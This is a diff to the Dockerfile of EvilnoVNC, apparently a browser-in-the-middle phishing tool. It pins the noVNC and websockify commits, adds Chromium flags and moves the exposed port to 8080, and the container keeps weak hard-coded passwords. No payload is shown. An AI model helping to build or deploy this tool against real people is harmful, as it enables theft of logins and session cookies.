@@ -6,7 +6,7 @@ ENV DISPLAY :0
 
 RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter && \
     rm -rf /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
-    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs"' >> /etc/chromium/chromium.conf && \
+    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-sync --no-first-run --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs"' >> /etc/chromium/chromium.conf && \
     dbus-uuidgen > /var/lib/dbus/machine-id
 
 RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
@@ -17,7 +17,9 @@ WORKDIR /home/user
 
 RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
     git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
+    cd /home/user/noVNC && git checkout eb0ad829d23971377dc001dbe0fbdf47a0ea2a0f && cd /home/user && \
     git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
+    cd /home/user/noVNC/utils/websockify && git checkout 354668143f844f3d066dd476a3c8fe51b4030f26 && cd /home/user && \
     rm -rf /home/user/noVNC/.git && \
     rm -rf /home/user/noVNC/utils/websockify/.git && \
     sudo apk del git
@@ -72,5 +74,5 @@ ENTRYPOINT ["/bin/bash","-c", "\
                 ./server.sh \"$@\"; \
             }; \"$@\"", "foo"]
 
-EXPOSE 80
+EXPOSE 8080
 CMD ["EvilnoVNC"]
